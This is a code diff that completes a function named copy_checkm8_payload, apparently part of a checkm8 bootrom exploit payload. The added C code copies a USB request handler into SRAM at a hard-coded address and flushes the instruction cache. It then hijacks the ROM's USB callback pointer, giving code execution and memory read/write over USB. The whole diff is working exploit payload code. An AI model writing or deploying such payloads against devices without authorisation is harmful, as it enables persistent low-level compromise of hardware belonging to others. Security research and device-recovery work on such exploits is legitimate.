@@ -1,6 +1,8 @@
 #include <stdint.h>
 #include <stdbool.h>
 
+#include "../checkm8/handler.h"
+
 typedef void (*write_ttb_t)(uint32_t val);
 typedef void (*flush_tlbs_t)(void);
 typedef void (*bcopy_t)(uint32_t src, uint32_t dest, uint32_t n);
@@ -19,6 +21,7 @@ uint32_t gFlag;
 #define TTBR0_BASE                  (0x1007c000)
 #define JUMP_PAYLOAD_BASE           (0x10079800)
 #define PAYLOAD_MAX_SIZE            (0x1000)
+#define USB_DEVICE_IO_CALLBACK      (0x10061A24)
 #define gDemotionRegister           (0x3f500000)
 
 #define remap_rom_to_sram   (1 << 0)
@@ -125,7 +128,29 @@ __attribute__((noinline)) void demote(void)
 
 __attribute__((noinline)) void copy_checkm8_payload(void)
 {
-    // todo
+    // Copy the usb_0xA1_2 handler (with thumb trampoline prefix) to
+    // JUMP_PAYLOAD_BASE. The handler intercepts USB 0xA1 requests to
+    // provide exec/memcpy/memset over USB, forwarding all other requests
+    // to the original ROM handler via the trampoline in its first 8 bytes.
+    my_bcopy((uint32_t)handler_bin, JUMP_PAYLOAD_BASE, handler_bin_len);
+
+    // Ensure handler code is visible to the instruction fetch unit.
+    // my_bcopy writes to D-cache; without flushing, the I-cache has stale
+    // data and the CPU would execute garbage when the handler is called.
+    asm volatile(
+        "dsb\n"
+        "mov r0, #0\n"
+        "mcr p15, 0, r0, c7, c5, 0\n"   /* ICIALLU: invalidate entire I-cache */
+        "dsb\n"
+        "isb\n"
+        ::: "r0", "memory"
+    );
+
+    // Set the USB device I/O callback pointer to the handler's entry point.
+    // The first 8 bytes are the trampoline to the original handler;
+    // executable code starts at offset +8, with +1 for Thumb mode = +0x9.
+    uint32_t* callbackPtr = (uint32_t*)USB_DEVICE_IO_CALLBACK;
+    *callbackPtr = JUMP_PAYLOAD_BASE + 0x9;
 }
 
 __attribute__((noinline)) int main_payload(void)
